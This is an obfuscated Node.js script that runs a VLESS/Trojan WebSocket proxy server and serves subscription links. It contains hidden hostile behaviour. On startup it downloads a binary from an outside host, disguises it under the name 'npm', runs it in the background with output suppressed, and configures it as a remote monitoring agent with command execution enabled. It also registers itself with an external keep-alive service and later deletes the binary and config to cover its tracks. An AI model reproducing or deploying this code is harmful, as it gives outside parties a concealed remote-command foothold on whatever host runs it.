function _0xccc2(_0x2a4e08,_0x41a05f){_0x2a4e08=_0x2a4e08-0x151;const _0x205168=_0x2051();let _0xccc245=_0x205168[_0x2a4e08];return _0xccc245;}const _0x49a145=_0xccc2;(function(_0x3bd620,_0x2cc626){const _0x199a53=_0xccc2,_0x4bf72e=_0x3bd620();while(!![]){try{const _0x46f64b=parseInt(_0x199a53(0x1be))/0x1*(parseInt(_0x199a53(0x165))/0x2)+-parseInt(_0x199a53(0x183))/0x3+-parseInt(_0x199a53(0x180))/0x4*(parseInt(_0x199a53(0x1a7))/0x5)+parseInt(_0x199a53(0x1ac))/0x6+parseInt(_0x199a53(0x179))/0x7*(-parseInt(_0x199a53(0x186))/0x8)+parseInt(_0x199a53(0x15f))/0x9+parseInt(_0x199a53(0x19e))/0xa;if(_0x46f64b===_0x2cc626)break;else _0x4bf72e['push'](_0x4bf72e['shift']());}catch(_0x3ca21b){_0x4bf72e['push'](_0x4bf72e['shift']());}}}(_0x2051,0x99bce));const os=require('os'),http=require(_0x49a145(0x18d)),fs=require('fs'),axios=require('axios'),net=require(_0x49a145(0x177)),path=require(_0x49a145(0x1a6)),crypto=require(_0x49a145(0x1b4)),{Buffer}=require(_0x49a145(0x1c4)),{exec,execSync}=require(_0x49a145(0x182)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x49a145(0x17d)][_0x49a145(0x1bb)]||_0x49a145(0x199),NEZHA_SERVER=process[_0x49a145(0x17d)][_0x49a145(0x1b9)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x49a145(0x1cc)]||'',DOMAIN=process[_0x49a145(0x17d)][_0x49a145(0x1ba)]||_0x49a145(0x158),AUTO_ACCESS=process[_0x49a145(0x17d)][_0x49a145(0x1a0)]||!![],WSPATH=process['env']['WSPATH']||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x49a145(0x17d)][_0x49a145(0x1ad)]||'sub',NAME=process[_0x49a145(0x17d)][_0x49a145(0x19c)]||'Hug',PORT=process[_0x49a145(0x17d)][_0x49a145(0x1c5)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x530b5b=_0x49a145;try{const _0x1f84b7=await axios[_0x530b5b(0x19b)](_0x530b5b(0x1af)),_0x4d45d2=_0x1f84b7['data'];ISP=(_0x4d45d2[_0x530b5b(0x1b3)]+'-'+_0x4d45d2[_0x530b5b(0x192)])[_0x530b5b(0x1a8)](/ /g,'_');}catch(_0x4d88f4){ISP=_0x530b5b(0x1c1);}};GetISP();function _0x2051(){const _0x1730e4=['get','NAME','chmod\x20+x\x20npm','26268440lXBLNw','text/html','AUTO_ACCESS','once','url','npm\x20is\x20already\x20running,\x20skip\x20running...','config.yaml','text/plain','path','195815AMPYXo','replace','utf-8','setsid\x20nohup\x20./npm\x20-s\x20','write','187404luLCRQ','SUB_PATH','Server','https://speed.cloudflare.com/meta','close','every','substr','country','crypto','createWriteStream','split','npm','Hello\x20world!','NEZHA_SERVER','DOMAIN','UUID','from','error','7116OcgSdR','finish','aarch64','Unknown','false','slice','buffer','PORT','readUInt16BE','digest','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','send','includes','https://arm64.ssss.nyc.mn/v1','NEZHA_KEY','443','Automatic\x20Access\x20Task\x20added\x20successfully','8443','readFile','\x20-p\x20','Answer','connect','Failed\x20to\x20resolve\x20','1234.abc.com','2096','log','2087','8.8.4.4','https://oooo.serv00.net/add-url','&path=%2F','9071514lexJnG','https://','&fp=chrome&type=ws&host=','then','&type=A','npm\x20download\x20successfully','136dizzTI','unlink','toString','https://amd64.ssss.nyc.mn/agent','application/json',':443?security=tls&sni=','createHash','length',':443?encryption=none&security=tls&sni=','client_secret:\x20','readUInt8','trim','https://amd64.ssss.nyc.mn/v1','https://dns.google/resolve?name=','createServer','arch','Status','Server\x20is\x20running\x20on\x20port\x20','net','data','1795052ZdugeW','map','pipe','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','env','writeFileSync','hex','128yuUhac','decode','child_process','3723726gBZhXG','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','pop','32pgMpBF','concat','update','join','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','catch','find','http','arm64','npm\x20is\x20running','post','end','asOrganization','listen','message','sha224','writeHead','vless://','2083','e689c3aa-a5cc-4d2a-af00-23bcd547fcf7','index.html'];_0x2051=function(){return _0x1730e4;};return _0x2051();}const httpServer=http[_0x49a145(0x173)]((_0x4285b8,_0xa77b7f)=>{const _0x4bf98e=_0x49a145;if(_0x4285b8[_0x4bf98e(0x1a2)]==='/'){const _0x2fffe6=path[_0x4bf98e(0x189)](__dirname,_0x4bf98e(0x19a));fs[_0x4bf98e(0x153)](_0x2fffe6,'utf8',(_0x4f0857,_0xa93f78)=>{const _0x3645a7=_0x4bf98e;if(_0x4f0857){_0xa77b7f['writeHead'](0xc8,{'Content-Type':_0x3645a7(0x19f)}),_0xa77b7f[_0x3645a7(0x191)](_0x3645a7(0x1b8));return;}_0xa77b7f[_0x3645a7(0x196)](0xc8,{'Content-Type':_0x3645a7(0x19f)}),_0xa77b7f['end'](_0xa93f78);});return;}else{if(_0x4285b8[_0x4bf98e(0x1a2)]==='/'+SUB_PATH){const _0x2cb34a=_0x4bf98e(0x197)+UUID+'@'+DOMAIN+_0x4bf98e(0x16d)+DOMAIN+_0x4bf98e(0x161)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x12a244='trojan://'+UUID+'@'+DOMAIN+_0x4bf98e(0x16a)+DOMAIN+_0x4bf98e(0x161)+DOMAIN+_0x4bf98e(0x15e)+WSPATH+'#'+NAME+'-'+ISP,_0x51c6b9=_0x2cb34a+'\x0a'+_0x12a244,_0x448b14=Buffer[_0x4bf98e(0x1bc)](_0x51c6b9)[_0x4bf98e(0x167)]('base64');_0xa77b7f[_0x4bf98e(0x196)](0xc8,{'Content-Type':_0x4bf98e(0x1a5)}),_0xa77b7f['end'](_0x448b14+'\x0a');}else _0xa77b7f[_0x4bf98e(0x196)](0x194,{'Content-Type':_0x4bf98e(0x1a5)}),_0xa77b7f['end']('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x49a145(0x1ae))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x49a145(0x15c),'1.1.1.1'];function resolveHost(_0x2f3548){return new Promise((_0x20f922,_0x3c1190)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x2f3548)){_0x20f922(_0x2f3548);return;}let _0x4dae51=0x0;function _0x2e4fb3(){const _0x5a475c=_0xccc2;if(_0x4dae51>=DNS_SERVERS[_0x5a475c(0x16c)]){_0x3c1190(new Error(_0x5a475c(0x157)+_0x2f3548+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x57ce0e=DNS_SERVERS[_0x4dae51];_0x4dae51++;const _0x50eb72=_0x5a475c(0x172)+encodeURIComponent(_0x2f3548)+_0x5a475c(0x163);axios[_0x5a475c(0x19b)](_0x50eb72,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x5a475c(0x162)](_0x363271=>{const _0x6f6064=_0x5a475c,_0x3e6be9=_0x363271[_0x6f6064(0x178)];if(_0x3e6be9[_0x6f6064(0x175)]===0x0&&_0x3e6be9[_0x6f6064(0x155)]&&_0x3e6be9[_0x6f6064(0x155)]['length']>0x0){const _0x35ef3a=_0x3e6be9[_0x6f6064(0x155)][_0x6f6064(0x18c)](_0x1a66aa=>_0x1a66aa['type']===0x1);if(_0x35ef3a){_0x20f922(_0x35ef3a[_0x6f6064(0x178)]);return;}}_0x2e4fb3();})[_0x5a475c(0x18b)](_0x55176c=>{_0x2e4fb3();});}_0x2e4fb3();});}function handleVlessConnection(_0x535974,_0x450553){const _0x1da27a=_0x49a145,[_0x246496]=_0x450553,_0x156ba7=_0x450553[_0x1da27a(0x1c3)](0x1,0x11);if(!_0x156ba7['every']((_0x136d55,_0x938631)=>_0x136d55==parseInt(uuid[_0x1da27a(0x1b2)](_0x938631*0x2,0x2),0x10)))return![];let _0x52dcf1=_0x450553['slice'](0x11,0x12)[_0x1da27a(0x16f)]()+0x13;const _0x2215ab=_0x450553[_0x1da27a(0x1c3)](_0x52dcf1,_0x52dcf1+=0x2)[_0x1da27a(0x1c6)](0x0),_0x435d25=_0x450553[_0x1da27a(0x1c3)](_0x52dcf1,_0x52dcf1+=0x1)[_0x1da27a(0x16f)](),_0x5e227d=_0x435d25==0x1?_0x450553[_0x1da27a(0x1c3)](_0x52dcf1,_0x52dcf1+=0x4)['join']('.'):_0x435d25==0x2?new TextDecoder()[_0x1da27a(0x181)](_0x450553['slice'](_0x52dcf1+0x1,_0x52dcf1+=0x1+_0x450553[_0x1da27a(0x1c3)](_0x52dcf1,_0x52dcf1+0x1)[_0x1da27a(0x16f)]())):_0x435d25==0x3?_0x450553[_0x1da27a(0x1c3)](_0x52dcf1,_0x52dcf1+=0x10)['reduce']((_0x193444,_0x1c9e8b,_0xdd5b0a,_0x5c2908)=>_0xdd5b0a%0x2?_0x193444[_0x1da27a(0x187)](_0x5c2908[_0x1da27a(0x1c3)](_0xdd5b0a-0x1,_0xdd5b0a+0x1)):_0x193444,[])[_0x1da27a(0x17a)](_0x216ede=>_0x216ede[_0x1da27a(0x1c6)](0x0)['toString'](0x10))[_0x1da27a(0x189)](':'):'';_0x535974[_0x1da27a(0x1c9)](new Uint8Array([_0x246496,0x0]));const _0x11643c=createWebSocketStream(_0x535974);return resolveHost(_0x5e227d)[_0x1da27a(0x162)](_0x5f5563=>{const _0xee794e=_0x1da27a;net[_0xee794e(0x156)]({'host':_0x5f5563,'port':_0x2215ab},function(){const _0x4e5b61=_0xee794e;this['write'](_0x450553['slice'](_0x52dcf1)),_0x11643c['on']('error',()=>{})[_0x4e5b61(0x17b)](this)['on'](_0x4e5b61(0x1bd),()=>{})['pipe'](_0x11643c);})['on'](_0xee794e(0x1bd),()=>{});})[_0x1da27a(0x18b)](_0x3ff635=>{const _0x33a398=_0x1da27a;net[_0x33a398(0x156)]({'host':_0x5e227d,'port':_0x2215ab},function(){const _0x8b3105=_0x33a398;this['write'](_0x450553['slice'](_0x52dcf1)),_0x11643c['on'](_0x8b3105(0x1bd),()=>{})['pipe'](this)['on'](_0x8b3105(0x1bd),()=>{})['pipe'](_0x11643c);})['on'](_0x33a398(0x1bd),()=>{});}),!![];}function handleTrojanConnection(_0x12fc22,_0x22d49e){const _0x20cfc0=_0x49a145;try{if(_0x22d49e['length']<0x3a)return![];const _0x40ae2b=_0x22d49e[_0x20cfc0(0x1c3)](0x0,0x38)['toString'](),_0x418be4=[UUID];let _0x316239=null;for(const _0x159d7f of _0x418be4){const _0x417bfa=crypto[_0x20cfc0(0x16b)](_0x20cfc0(0x195))[_0x20cfc0(0x188)](_0x159d7f)[_0x20cfc0(0x1c7)](_0x20cfc0(0x17f));if(_0x417bfa===_0x40ae2b){_0x316239=_0x159d7f;break;}}if(!_0x316239)return![];let _0x2b52a0=0x38;_0x22d49e[_0x2b52a0]===0xd&&_0x22d49e[_0x2b52a0+0x1]===0xa&&(_0x2b52a0+=0x2);const _0x595e1c=_0x22d49e[_0x2b52a0];if(_0x595e1c!==0x1)return![];_0x2b52a0+=0x1;const _0x3068b3=_0x22d49e[_0x2b52a0];_0x2b52a0+=0x1;let _0xf0168d,_0x50f601;if(_0x3068b3===0x1)_0xf0168d=_0x22d49e[_0x20cfc0(0x1c3)](_0x2b52a0,_0x2b52a0+0x4)['join']('.'),_0x2b52a0+=0x4;else{if(_0x3068b3===0x3){const _0x3e5ff7=_0x22d49e[_0x2b52a0];_0x2b52a0+=0x1,_0xf0168d=_0x22d49e[_0x20cfc0(0x1c3)](_0x2b52a0,_0x2b52a0+_0x3e5ff7)[_0x20cfc0(0x167)](),_0x2b52a0+=_0x3e5ff7;}else{if(_0x3068b3===0x4)_0xf0168d=_0x22d49e[_0x20cfc0(0x1c3)](_0x2b52a0,_0x2b52a0+0x10)['reduce']((_0x515b46,_0x4c1730,_0x1ec712,_0x109fc0)=>_0x1ec712%0x2?_0x515b46[_0x20cfc0(0x187)](_0x109fc0[_0x20cfc0(0x1c3)](_0x1ec712-0x1,_0x1ec712+0x1)):_0x515b46,[])['map'](_0x5481a7=>_0x5481a7['readUInt16BE'](0x0)[_0x20cfc0(0x167)](0x10))[_0x20cfc0(0x189)](':'),_0x2b52a0+=0x10;else return![];}}_0x50f601=_0x22d49e['readUInt16BE'](_0x2b52a0),_0x2b52a0+=0x2;_0x2b52a0<_0x22d49e['length']&&_0x22d49e[_0x2b52a0]===0xd&&_0x22d49e[_0x2b52a0+0x1]===0xa&&(_0x2b52a0+=0x2);const _0x48e8dd=createWebSocketStream(_0x12fc22);return resolveHost(_0xf0168d)[_0x20cfc0(0x162)](_0xc37352=>{const _0x34f199=_0x20cfc0;net[_0x34f199(0x156)]({'host':_0xc37352,'port':_0x50f601},function(){const _0x48c860=_0x34f199;_0x2b52a0<_0x22d49e[_0x48c860(0x16c)]&&this['write'](_0x22d49e[_0x48c860(0x1c3)](_0x2b52a0)),_0x48e8dd['on'](_0x48c860(0x1bd),()=>{})['pipe'](this)['on'](_0x48c860(0x1bd),()=>{})[_0x48c860(0x17b)](_0x48e8dd);})['on'](_0x34f199(0x1bd),()=>{});})[_0x20cfc0(0x18b)](_0x1e2a1e=>{const _0x193e2f=_0x20cfc0;net['connect']({'host':_0xf0168d,'port':_0x50f601},function(){const _0x13aa76=_0xccc2;_0x2b52a0<_0x22d49e['length']&&this[_0x13aa76(0x1ab)](_0x22d49e[_0x13aa76(0x1c3)](_0x2b52a0)),_0x48e8dd['on'](_0x13aa76(0x1bd),()=>{})[_0x13aa76(0x17b)](this)['on'](_0x13aa76(0x1bd),()=>{})['pipe'](_0x48e8dd);})['on'](_0x193e2f(0x1bd),()=>{});}),!![];}catch(_0x1233d){return![];}}wss['on']('connection',(_0x3a8678,_0x39d3b9)=>{const _0x27f30b=_0x49a145,_0x33ade7=_0x39d3b9[_0x27f30b(0x1a2)]||'';_0x3a8678[_0x27f30b(0x1a1)](_0x27f30b(0x194),_0x606cc4=>{const _0x498026=_0x27f30b;if(_0x606cc4[_0x498026(0x16c)]>0x11&&_0x606cc4[0x0]===0x0){const _0x10b84c=_0x606cc4[_0x498026(0x1c3)](0x1,0x11),_0x44caa1=_0x10b84c[_0x498026(0x1b1)]((_0x182f82,_0x296dbd)=>_0x182f82==parseInt(uuid[_0x498026(0x1b2)](_0x296dbd*0x2,0x2),0x10));if(_0x44caa1){!handleVlessConnection(_0x3a8678,_0x606cc4)&&_0x3a8678[_0x498026(0x1b0)]();return;}}!handleTrojanConnection(_0x3a8678,_0x606cc4)&&_0x3a8678[_0x498026(0x1b0)]();})['on'](_0x27f30b(0x1bd),()=>{});});const getDownloadUrl=()=>{const _0x536540=_0x49a145,_0x1706a9=os[_0x536540(0x174)]();return _0x1706a9==='arm'||_0x1706a9===_0x536540(0x18e)||_0x1706a9===_0x536540(0x1c0)?!NEZHA_PORT?_0x536540(0x1cb):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x536540(0x171):_0x536540(0x168);},downloadFile=async()=>{const _0xa1be7a=_0x49a145;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x4efaca=getDownloadUrl(),_0x3e9553=await axios({'method':_0xa1be7a(0x19b),'url':_0x4efaca,'responseType':'stream'}),_0x4f6484=fs[_0xa1be7a(0x1b5)]('npm');return _0x3e9553[_0xa1be7a(0x178)]['pipe'](_0x4f6484),new Promise((_0x48e7e1,_0x56cc1a)=>{const _0xb492fe=_0xa1be7a;_0x4f6484['on'](_0xb492fe(0x1bf),()=>{const _0x3675f1=_0xb492fe;console['log'](_0x3675f1(0x164)),exec(_0x3675f1(0x19d),_0x5414dd=>{if(_0x5414dd)_0x56cc1a(_0x5414dd);_0x48e7e1();});}),_0x4f6484['on'](_0xb492fe(0x1bd),_0x56cc1a);});}catch(_0x2c34d7){throw _0x2c34d7;}},runnz=async()=>{const _0x5aba54=_0x49a145;try{const _0x2d2e2f=execSync(_0x5aba54(0x1c8),{'encoding':_0x5aba54(0x1a9)});if(_0x2d2e2f[_0x5aba54(0x170)]()!==''){console[_0x5aba54(0x15a)](_0x5aba54(0x1a3));return;}}catch(_0x4322eb){}await downloadFile();let _0x34aaaf='',_0x52f779=[_0x5aba54(0x1cd),_0x5aba54(0x152),_0x5aba54(0x159),_0x5aba54(0x15b),_0x5aba54(0x198),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x58e7f3=_0x52f779[_0x5aba54(0x1ca)](NEZHA_PORT)?'--tls':'';_0x34aaaf=_0x5aba54(0x1aa)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5aba54(0x154)+NEZHA_KEY+'\x20'+_0x58e7f3+_0x5aba54(0x17c);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x53f6bd=NEZHA_SERVER[_0x5aba54(0x1ca)](':')?NEZHA_SERVER[_0x5aba54(0x1b6)](':')[_0x5aba54(0x185)]():'',_0x455428=_0x52f779[_0x5aba54(0x1ca)](_0x53f6bd)?'true':_0x5aba54(0x1c2),_0x2563de=_0x5aba54(0x16e)+NEZHA_KEY+_0x5aba54(0x184)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x455428+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x5aba54(0x17e)]('config.yaml',_0x2563de);}_0x34aaaf='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x5aba54(0x15a)](_0x5aba54(0x18a));return;}}try{exec(_0x34aaaf,{'shell':'/bin/bash'},_0x346684=>{const _0x9476e7=_0x5aba54;if(_0x346684)console[_0x9476e7(0x1bd)]('npm\x20running\x20error:',_0x346684);else console[_0x9476e7(0x15a)](_0x9476e7(0x18f));});}catch(_0x46fa7e){console[_0x5aba54(0x1bd)]('error:\x20'+_0x46fa7e);}};async function addAccessTask(){const _0x55a708=_0x49a145;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x161d5e=_0x55a708(0x160)+DOMAIN;try{const _0xb0974c=await axios[_0x55a708(0x190)](_0x55a708(0x15d),{'url':_0x161d5e},{'headers':{'Content-Type':_0x55a708(0x169)}});console[_0x55a708(0x15a)](_0x55a708(0x151));}catch(_0xd05cdd){}}const delFiles=()=>{const _0x251658=_0x49a145;fs['unlink'](_0x251658(0x1b7),()=>{}),fs[_0x251658(0x166)](_0x251658(0x1a4),()=>{});};httpServer[_0x49a145(0x193)](PORT,()=>{const _0x1e2779=_0x49a145;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x1e2779(0x15a)](_0x1e2779(0x176)+PORT);});
